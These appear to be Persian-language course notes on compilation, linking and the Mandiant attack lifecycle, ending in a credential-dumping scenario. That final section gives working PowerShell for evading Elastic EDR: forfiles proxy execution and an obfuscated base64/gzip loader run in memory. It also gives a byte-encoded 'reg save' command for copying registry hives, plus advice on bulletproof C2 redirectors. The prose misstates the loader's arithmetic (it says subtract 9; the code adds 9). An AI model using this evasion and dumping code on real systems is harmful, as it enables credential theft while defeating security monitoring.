
1️⃣ بررسی تفاوت های زبان های Compile و Interpreter

در زبان های compile ماننده C و ++C کد ما توسط یک Compiler ماننده GCC یک سری سلسله مراتبی رو طی میکنه و در نهایت کد نوشته مارو  به OpCode یا همون کد ماشین تبدیل میکنه 
در اصل کامپایلر برنامه‌ای است که کد نوشته‌شده در یک زبان برنامه‌نویسی (**source language**) را خوانده و آن را به یک برنامه معادل در زبان دیگر (**target language**) ترجمه می‌کند. همچنین در هنگام ترجمه، خطاهای موجود در برنامه را شناسایی و گزارش می‌دهد.

مراحل 

![[Pasted image 20260615123032.png]]

![[Pasted image 20260615123054.png]]


مرحله اول compiler اینه که بیاد و lexical analyser کنه کاری نداره که ما چی نوشتیم میاد برای ما اون مقدار رو که داره رو identifire میکنه 
بعدش syntax tree میکنه 
بعدش semantic analysis میکنه منطق برنامه رو چک میکنه

![[Pasted image 20260615123203.png]]


![[Pasted image 20260615123223.png]]

حالا وقتی این مراحل تی میشه برای کامپایل یک symbol table تشکیل میشه که این مراحل ذخیره میشه که دقیقا چطوری کامپایل شده متغیر ها توابع اینا چی بودن در قالب یک فایل pdb 

### Interpreter

در زبان های Interpreter ماننده python,perl و.... کد برنامه ما توسط یک Engine خط به خط تفسیر میشه و Execute میشه چون کد ما خط به خط تفسیر میشه به همین خاطر سرعتش کاهش پیدا میکنه 
به عنوان مثال برای اینکه ما بتونیم یه کد python اجرا کنیم این کد باید توسط یک Engine به اسم 

- python.exe 
تفسیر و اجرا بشه.
> زبان برنامه نویسی python دوتا تابع داره به اسم exec و eval که این توابع مجموعه یی از استرینگ که  بهش میدیم رو میاد در قالب یک object از کد python اجرا میکنه 


### 2️⃣ بررسی تفاوت های Static Linking و Dynamic Linking

در Dynamic Linking کد ما در زمان RunTime به کتابخونه هایی (dll,so) وابسته است و چون در زمان اجرا به توابع داخل کتابخونه نیاز دارد برنامه اصلی ما حجم کد کمتری دارد 
اما چون به کتابخونه های خاصی نیاز دارد این کتابخونه ها باید همراه با فایل رو سیستم هدف باشد 

در Static Linking  تمامی dependency ها در زمان کامپایل داخل کد برنامه مون کپی میشه و چون کد کتابخونه مون داخل برنامه کپی میشه حجم برنامه زیاد میشه اما چون کد کتابخونه ها داخل برنامه اصلی کپی شده دیگر هیچ dependency نداره 

> نکته : AV/EDR ها معمولا فرایند مانیتور رو در Dynamic Linking انجام میدهند زیر در static Linking این الگو متفاوت است 


### 3️⃣ حملاتی که در مدل Mandiant اتفاق میافتد را لیست کنید ( طبق هر فاز پشت سر هم پیش برید )

#####  ۱. (Initial Compromise)
در این مرحله، مهاجمان سعی می‌کنند اولین راه ورود به شبکه سازمان را پیدا کنند.

##### ۲.  (Establish Foothold)
پس از ورود موفق، مهاجمان ابزارهایی را مستقر می‌کنند تا دسترسی خود را حتی در صورت راه‌اندازی مجدد سیستم یا تغییر رمز عبور اولیه حفظ کنند.

##### ۳.  (Escalate Privileges)
مهاجم معمولاً در ابتدا دسترسی یک کاربر عادی را دارد و برای کنترل بیشتر شبکه، نیاز به دسترسی مدیر (Administrator یا SYSTEM) دارد.

##### ۴. (Internal Reconnaissance)
مهاجم محیط اطراف خود را بررسی می‌کند تا بفهمد کجا قرار دارد، سیستم‌های مهم کجا هستند و ساختار شبکه چگونه است.

##### ۵.  (Move Laterally)
مهاجم از سیستم اولیه به سایر سیستم‌های شبکه منتقل می‌شود تا به هدف نهایی خود نزدیک‌تر شود.

##### ۶. (Maintain Presence)
مهاجمان برای اینکه توسط تیم‌های امنیتی (SOC) شناسایی نشوند و دسترسی طولانی‌مدت داشته باشند، خود را پنهان کرده و راه‌های نفوذ جایگزین ایجاد می‌کنند.

##### ۷.  (Complete Mission)
در این مرحله نهایی، مهاجمان به هدف اصلی خود از نفوذ می‌رسند. و بسته به نوع حمله که می تونه Espionage یا Sabotage باشه 


### 4️⃣ یک سناریو TTP دلخواه بنویسید

- **عنوان سناریو (Tactic) :** سرقت رمز عبور و جمع اوری اطلاعات (ِDicovery) 
-  **تکنیک (Technique) :** استخراج اعتبارنامه از سیستم‌عامل (OS Credential Dumping) و LDAP Query
- **رویه (Procedure) :** از اونجایی که در فرایند Discovery ما مرتب باید در سطح شبکه و سیستم با استفاده از ابزار های مختلف و قابلیت هایی که سیستم عامل در اختیار ما قرار می دهد برای ساخت ابزار ماننده LDAP و.... 
سولوشن هایی امنیتی (EDR) هم بیکار نمیشینن و مرتب چنین مواردی رو مانیتور میکنن و  Telemetry ارسال میکنن برای اینکه ما این مورد دور بزنیم بهتره که از ابزاری که وجود داره یا ابزاری که خودمون توسعه میدیم بیایم داخل سیستم خودمون استفاده کنیم اما چطوری ؟؟ با استفاده از تکنیک Dynamic Port Forwarding یا اگر سیستم تارگت پشت NAT قرار داره با استفاده از Remote Port Forwarding میایم یک Tunnel درست میکنیم و ابزار خودمون رو با استفاده از پروژه یی ماننده Proxychaines از طریق اون Tunnel اجرا میکنیم اینجا ما دیگر باینری داخل شبکه نفرستادیم بلکه یه ترافیک LDAP و TCP داریم میتونیم همین فرایند رو Advance تر کنیم و یک Redirecotor ایجاد کنیم اینجا IP اصلی C2 ما هم لو نمیره و اون ایپی که در اصل در ترافیک می افته ایپی اون سرور Redirecotor هست که این سرور هم میتونه یک سرور Bullet Prof باشه 
و بعد از فرایند Discovery که در شبکه انجام دادیم و اگر به Credential لازم برای dump کردن LSA Secret ها رسیدیم میتونیم بازم به جای اینکه هر طور شده از lsass هندل بگیریم یا از SAM file یک snapshot بگیریم که به شدت EDR ها روش حساس هستند میتونیم از یک NamedPipe استفاده کنیم به اسم winreg که این Pipe بر بستر Dynamic Port Mapping RPC کار میکنه به ریجستری سیستم هدف دسترسی پیدا کنیم و یه snapshot ازش بگیریم اما تفاوتی که وجود داره اینه که در این فرایند دیگر Process ما در لاگ ها نمی افته بلکه پروسه svchost می افته 

![[Pasted image 20260615132127.png]]

و در لاگ های شبکه در EventCode 5145 چنین share می افته و در IP سورس EventCode 18 sysmon پروسه svchost می اقته که به اون Pipe وصل شده 

یکی دیگر از روش ها استفاده از Proxy Execution هست و استفاده از یک LOLBINS تحت عنوان forfiles 

در این سناریو یکی از EDR Elastic هدف قرار میگیره و Bypass میشه در تاتکتیک Credential Dumping 

فرایند کلی 

```powershell
forfiles /p "C:\Program Files\Elastic\Endpoint" /m elastic-endpoint.exe /c "powershell -command C:\Temp\system32.ps1"
```

###### system32.ps1

```powershell
$data = "H4sIAAAAAAAEAG2QWQ4DMQhDr2S2BO5/sdpoKnWkSvkg5NmYYMLghsIE5mAGw+uBB6INocIL1chBB64RpgSTUjUZiDn2kpM80FUA3+6+Qv1ikYuZ+jR/Zq3P+B9V0LBfqriqWZJfubCNyszaiHaCS2GmHlsewfLcraGhmkUfW3n8bFrrAH1Ch/KYf1Opj3TwD+LuxINkgPoA3FlXXlABAAA="
$con = [System.Convert]::FromBase64String($data)

$stream_memory = New-Object System.IO.MemoryStream
$stream_memory.Write($con,0,$con.Length)
$stream_memory.Seek(0,0) | Out-Null

$GZ_stream = New-Object System.IO.Compression.GZipStream($stream_memory,[System.IO.Compression.CompressionMode]::Decompress)
$read = New-Object System.IO.StreamReader($GZ_stream)
$decoded_text = $read.ReadToEnd()  
$out = ""
for ($i = 0; $i -lt $decoded_text.Length; $i=$i+3) {
    $c = $decoded_text.Substring($i,3)
    $c = [int]$c + 9
    $out += [char][int]$c
}

iex($out)
```

این payload میاد کد ASCII اون دستوری که بهش گفتیم رو میگیره و 9 رقم ازش کم میکنه و به با استفاده از کلاس System.IO.Compression  تبدیل به base64 و inmemory execute میکنیم 

دلیل اینکه اسم فایل system32 هستش به خاطر Bypass CLM هست 
اما این خودش یه فایل دیگر رو هم میخونه 

```powershell
$bytes = 114,101,103,32,115,97,118,101,32,104,107,108,109,92,115,121,115,116,101,109,32,32,67,58,92,84,101,109,112,92,115,97,109,46,115,97,118,101,32,61,32,114,101,103,32,115,97,118,101,32,104,107,108,109,92,115,121,115,116,101,109,32,32,67,58,92,84,101,109,112,92,115,97,109,46,115,97,118,101,59,105,101,120,40,114,101,103,32,115,97,118,101,32,104,107,108,109,92,115,121,115,116,101,109,32,32,67,58,92,84,101,109,112,92,115,97,109,46,115,97,118,101,41
$msg = -join ($bytes | ForEach-Object {[char]$_})
Invoke-Expression ($msg)
```

این میشه دستوری که قراره در نهایت برای ما یک snapshot از SAM file بگیره 

![[Pasted image 20260615133319.png]]


اینجا ALert میندازه ELastic و میگه prevent کرده اما 

![[Pasted image 20260615133400.png]]

ما به هدف نهاییمون رسیدیم 